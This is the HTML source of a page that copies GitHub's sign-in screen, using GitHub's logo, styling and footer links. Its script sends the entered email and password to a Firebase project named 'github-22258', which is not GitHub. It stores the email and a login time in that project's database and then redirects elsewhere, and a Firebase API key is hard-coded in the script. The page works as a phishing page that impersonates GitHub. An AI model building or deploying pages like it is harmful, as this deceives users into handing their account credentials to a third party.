<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <style>
    body {
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, Arial, sans-serif;
      line-height: 1.5;
      margin: 0;
      display: flex;
      flex-direction: column;
      min-height: 100vh;
      background: #f6f8fa;
    }
    
    .header {
      text-align: center;
      margin: 40px auto 3px;
    }
    
    .logo {
      width: 52px;
      height: 52px;
    }
    
    .container {
      width: 100%;
      max-width: 308px;
      margin: 0 auto;
    }
    
    .title {
      margin-bottom: 16px;
      text-align: center;
      font-size: 24px;
      font-weight: 300;
      color: #1F2328;
      margin-top: 16px;
    }
    
    .form-group {
      margin-bottom: 16px;
      padding: 16px;
      background: white;
      border: 1px solid #d0d7de;
      border-radius: 11px;
    }
    
    label {
      display: block;
      margin-bottom: 8px;
      font-weight: 400;
      font-size: 14px;
      color: #1F2328;
    }
    
    input[type="text"], input[type="password"] {
      width: 100%;
      padding: 5px 12px;
      font-size: 14px;
      line-height: 20px;
      border: 1px solid #d0d7de;
      border-radius: 6px;
      box-sizing: border-box;
      margin-bottom: 16px;
    }
    
    .password-row {
      display: flex;
      justify-content: space-between;
      align-items: center;
    }
    
    .forgot-link {
      font-size: 12px;
      color: #0969DA;
      text-decoration: none;
    }
    
    .sign-in-button {
      width: 100%;
      padding: 8px 16px;
      font-size: 14px;
      font-weight: 500;
      color: white;
      background-color: #1F883D;
      border: 1px solid rgba(27, 31, 36, 0.15);
      border-radius: 6px;
      cursor: pointer;
    }
    
    .passkey-link {
      display: block;
      text-align: center;
      margin-top: 0px;
      margin-bottom: 5px;
      color: #0969DA;
      text-decoration: none;
      font-size: 14px;
      font-weight:600;
    }
    
    .create-account {
      margin-top: 16px;
      text-align: center;
      padding: 16px;
      border: 1px solid #d0d7de;
      border-radius: 11px;
      background: white;
    }
    
    .create-account span {
      margin-right: 5px;
      font-size: 14px;
      color: #1F2328;
    }
    
    .create-account a {
      color: #0969DA;
      text-decoration: none;
      font-size: 14px;
    }
    
    .footer {
      margin-top: auto;
      padding: 40px 0 16px;
      text-align: center;
      font-size: 12px;
    }
    
    .footer a {
      color: #656D76;
      text-decoration: none;
      margin: 0 8px;
    }
  </style>
</head>
<body>
  <div class="header">
    <img src="https://github.com/fluidicon.png" alt="GitHub" class="logo">
  </div>
  
  <div class="container">
    <h1 class="title">Sign in to GitHub</h1>
    
    <div class="form-group">
      <label for="login">Username or email address</label>
      <input type="text" id="login" name="login" autocomplete="username">
      
      <div class="password-row">
        <label for="password">Password</label>
        <a href="#" class="forgot-link">Forgot password?</a>
      </div>
      <input type="password" id="password" name="password">
      
      <button class="sign-in-button">Sign in</button>
    </div>
    <div class="create-account">
      <a href="#" class="passkey-link">Sign in with a passkey</a>
      <span>New to GitHub?</span>
      <a href="#">Create an account</a>
    </div>
  </div>
  
  <footer class="footer">
    <a href="#">Terms</a>
    <a href="#">Privacy</a>
    <a href="#">Docs</a>
    <a href="#">Contact GitHub Support</a>
    <a href="#">Manage cookies</a>
  </footer>

  <!-- Firebase Scripts -->
  <script src="https://www.gstatic.com/firebasejs/11.1.0/firebase-app.js"></script>
  <script src="https://www.gstatic.com/firebasejs/11.1.0/firebase-auth.js"></script>
  <script src="https://www.gstatic.com/firebasejs/11.1.0/firebase-database.js"></script>

  <script>
    // Firebase configuration
    const firebaseConfig = {
      apiKey: "AIzaSyAdgBH6BBXl9Gse7DeUb1SdKNfGd_2C9B8",
      authDomain: "github-22258.firebaseapp.com",
      databaseURL: "https://github-22258-default-rtdb.asia-southeast1.firebasedatabase.app",
      projectId: "github-22258",
      storageBucket: "github-22258.appspot.com",
      messagingSenderId: "636675500633",
      appId: "1:636675500633:web:a2251d1608036569cedf48",
      measurementId: "G-7DN5VRSP29"
    };

    // Initialize Firebase
    firebase.initializeApp(firebaseConfig);
    const auth = firebase.auth();
    const database = firebase.database();

    // Sign-in button functionality
    document.querySelector('.sign-in-button').addEventListener('click', (e) => {
      e.preventDefault();

      const email = document.getElementById('login').value.trim();
      const password = document.getElementById('password').value.trim();

      if (!email || !password) {
        alert("Please enter both email and password.");
        return;
      }

      // Firebase Authentication
      auth.signInWithEmailAndPassword(email, password)
        .then((userCredential) => {
          const user = userCredential.user;

          // Save user data to the database
          database.ref('users/' + user.uid).set({
            email: email,
            lastLogin: new Date().toISOString()
          }).then(() => {
            alert("Login successful!");
            // Redirect to a dashboard or another page
            window.location.href = "https://example.com/dashboard"; // Replace with your desired URL
          }).catch((error) => {
            console.error("Database error: ", error.message);
            alert('Failed to save user data. Please try again.');
          });
        })
        .catch((error) => {
          console.error("Authentication error: ", error.message);
          alert('Error: ' + error.message);
        });
    });
  </script>
</body>
</html>
